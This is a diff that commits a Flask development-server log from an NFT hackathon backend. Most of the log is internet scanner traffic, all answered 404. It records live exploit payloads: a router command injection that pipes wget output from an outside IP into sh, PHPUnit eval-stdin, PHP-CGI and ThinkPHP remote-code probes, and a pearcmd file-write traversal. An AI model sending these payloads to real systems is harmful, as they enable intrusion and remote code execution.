@@ -1,0 +1,145 @@
+INFO:__main__:Connected to Arbitrum Testnet
+ * Serving Flask app 'backend_1'
+ * Debug mode: on
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://194.87.46.228:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug: * Restarting with stat
+INFO:__main__:Connected to Arbitrum Testnet
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 465-234-999
+INFO:werkzeug:127.0.0.1 - - [19/Oct/2024 23:12:39] "[33mGET /login.rsp HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [19/Oct/2024 23:34:48] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:80.85.247.104 - - [19/Oct/2024 23:43:41] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [19/Oct/2024 23:47:41] "[33mGET /command_port.ini HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 00:01:28] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 00:01:42] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 00:38:13] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 00:54:09] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 01:25:50] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 01:31:21] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 01:40:22] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 02:17:20] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 02:17:38] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 02:17:43] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 02:43:32] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 02:52:05] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 02:52:14] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 03:01:15] "[33mGET /login.rsp HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 03:13:01] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 03:24:41] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 03:28:00] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 03:48:04] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:11:32] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:23:45] "[33mGET /command_port.ini HTTP/1.0[0m" 404 -
+INFO:werkzeug:147.185.132.72 - - [20/Oct/2024 04:31:58] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:32:00] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:34:26] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:42:21] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:42:30] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:50:25] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 04:51:30] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 05:00:18] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 05:00:38] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 05:58:06] "[33mGET /restore.php?lang=en HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 06:05:54] "[33mGET /login.rsp HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 06:07:27] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 06:13:44] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 06:18:49] "[33mGET /restore.php?lang=en HTTP/1.0[0m" 404 -
+INFO:werkzeug:64.62.197.175 - - [20/Oct/2024 06:24:59] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.197.181 - - [20/Oct/2024 06:25:08] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 06:31:16] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 06:31:26] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 07:01:11] "[33mGET /login.rsp HTTP/1.0[0m" 404 -
+INFO:werkzeug:205.210.31.49 - - [20/Oct/2024 07:15:17] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 07:16:42] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 07:27:01] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 07:32:27] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:80.85.247.104 - - [20/Oct/2024 08:02:41] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug: * Detected change in '/var/www/MoreTech2024NFT/backend/app.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:__main__:Connected to Arbitrum Testnet
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 465-234-999
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:09:32] "[33mGET /login.rsp HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:10:44] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug: * Detected change in '/var/www/MoreTech2024NFT/backend/backend_1.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:__main__:Connected to Arbitrum Testnet
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 465-234-999
+INFO:__main__:Connected to Arbitrum Testnet
+ * Serving Flask app 'backend_1'
+ * Debug mode: on
+Address already in use
+Port 5000 is in use by another program. Either identify and stop that program, or start the server with a different port.
+INFO:werkzeug:80.85.247.104 - - [20/Oct/2024 08:16:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:80.85.247.104 - - [20/Oct/2024 08:23:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:24:16] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:34:11] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:49:09] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:49:20] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:49:21] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+INFO:werkzeug: * Detected change in '/var/www/MoreTech2024NFT/backend/app.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:__main__:Connected to Arbitrum Testnet
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 465-234-999
+INFO:werkzeug: * Detected change in '/var/www/MoreTech2024NFT/backend/app.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:__main__:Connected to Arbitrum Testnet
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 465-234-999
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:07] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:11] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:14] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:16] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:20] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:24] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:27] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:30] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:33] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:35] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:38] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:41] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:43] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:47] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:50] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:53] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:57:57] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:00] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:03] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:06] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:09] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:12] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:14] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:18] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:21] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:23] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:27] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:30] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:32] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:35] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:38] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:40] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:44] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:46] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:49] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:52] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:55] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:58:58] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:59:01] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:59:04] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:59:07] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:59:10] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 08:59:12] "[33mGET /containers/json HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 09:07:03] "[33mGET /login.rsp HTTP/1.0[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [20/Oct/2024 09:22:31] "GET / HTTP/1.0" 200 -
+INFO:werkzeug: * Detected change in '/var/www/MoreTech2024NFT/backend/backend_1.py', reloading
+INFO:werkzeug: * Restarting with stat
+  File "/var/www/MoreTech2024NFT/backend/backend_1.py", line 219
+    >>>>>>> 3a90cbf0d646113ba686368da2cba25f115dd8e4
+            ^
+SyntaxError: invalid decimal literal
